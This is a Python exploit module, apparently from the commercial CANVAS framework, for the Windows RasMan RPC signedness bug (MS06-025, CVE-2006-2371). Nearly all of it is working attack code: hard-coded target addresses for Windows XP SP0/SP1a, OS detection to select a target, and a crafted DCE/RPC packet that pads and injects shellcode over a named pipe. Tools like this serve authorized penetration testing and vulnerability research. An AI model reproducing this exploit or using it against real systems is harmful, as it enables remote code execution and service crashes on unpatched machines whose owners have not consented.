#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2003
#http://www.immunityinc.com/CANVAS/ for more information


#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
import struct

if "." not in sys.path: sys.path.append(".")

from exploitutils import *
import canvasengine
from msrpcexploit import msrpcexploit

# GUI info
NAME= "RasMan RPC Server Signedness Bug"
DESCRIPTION= "RasMan RPC Server Signedness Bug"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION["Date public"] = "06/13/2006"
DOCUMENTATION["References"]="http://www.microsoft.com/technet/security/Bulletin/MS06-025.mspx"
DOCUMENTATION["Platforms Tested"] = "Windows XP Home/Pro SP1a (up2date), Windows XP Home/Pro SP0 (base install)"
DOCUMENTATION["MS"]="MS06-025"
DOCUMENTATION["CVE Name"] = "CVE-2006-2371"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-2371"
DOCUMENTATION['CVSS'] = 7.5
DOCUMENTATION["Notes"]=""" If you choose the wrong version to attack, RasMan may stop
responding (with MSRPC Pipe Not Available) errors, and will most likely
not repond to net start or net stop requests.

"""
VERSION="0.1"
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "XP" ]    #remote potential only on xpsp1 and below
PROPERTY['MSADV'] = "MS06-025"
GTK2_DIALOG="dialog.glade2"
CHANGELOG="""

"""

NOTES="""

  long Function_0c(
    [in,out] [size_is(element_77)] [unique] byte *element_76,
        [in] long element_77
  );

  
"""

runAnExploit_gtk2 = canvasengine.runAnExploit_gtk2
runExploit = canvasengine.runExploit

# info, align, index
targets = {
    0 : ["Autoversioning N/A", 0,0],
    1 : ["Windows XP Home/Pro base", 0, 0x807cf8ceL],
    2 : ["Windows XP Home/Pro SP1a up2date", 0, 0x80af56eeL]
}

class theexploit(msrpcexploit):
    def __init__(self):
        msrpcexploit.__init__(self)
        self.version        = 0
        self.badstring      = "\x00\\/.:$"
        self.UUID           = u"20610036-fa22-11cf-9823-00a0c911e5df"
        self.uuidversion    = u"1.0"
        self.targetfunction = 0xc
        self.name           = NAME
   
    def buildConnectionList(self):
        self.connectionList= ["ncacn_np:%s[\\srvsvc]"% (self.host)]
        return self.connectionList
    
    def testOS(self):        
        app = self.engine.getModuleExploit("osdetect")
        app.link(self)
        self.log("target=%s->%s"%(self.target,app.target))
        result=app.run()
        
        if result == 0:
            self.log("Unknown OS, automatic detection failed (try choosing a version)")
            return 0
        
        if app.result.find("2000") > -1:
            #self.version = WIN2K
            self.log("OS vulnerable only locally: %s" % result)
            return 0
        
        elif app.result.find("XP") > -1:
            #self.version = XP
            self.log("OS might be vulnerable (SP0, SP1a): %s" % result)
            self.log("Assuming it is SP1a")
            self.version=2
            return 1
        
        elif app.result.find("NT") > -1:
            #self.version = NT4
            self.log("OS vulnerable only locally: %s" % result)
            return 0
        
        else:
            self.log("OS not vulnerable: %s" % result)

        return 0
    
    def buildDcePacket(self):
        description, align, index = targets[self.version]
        pkt = ""
        data = ""
        
        if 1:
            self.log("Attacking version: %s via index %x" % (description,index))
            #PAYLOAD
            Data = ""
            Data += "A"*4
            #index
            Data += struct.pack("<L", index)
            Data += "C"*36
            Data += self.shellcode
            
            l = len(Data)
            
            if l > 0x9e4:
                raise Exception, "Shellcode too big!"
            else:
                l = 0x9e4 - l
                Data += "D"*l
            
            #MARSHALL
            #pseudo ptr
            pkt += struct.pack("<L", 0x12ef4c)
            #len
            pkt += struct.pack("<L", len(Data))
            #Data
            pkt += Data            
            #len
            pkt += struct.pack("<L", len(Data))
                        
        else:
            raise Exception, "XP base/SP1a only attack."
        
        return pkt
    
    def displayVersions(self):
        i = 0
        for listline in targets.values():
            print "%d : %s"% (i, listline[0])
            i = i + 1
    
if __name__== '__main__':
    app = theexploit()
    ret=standard_callback_commandline(app)
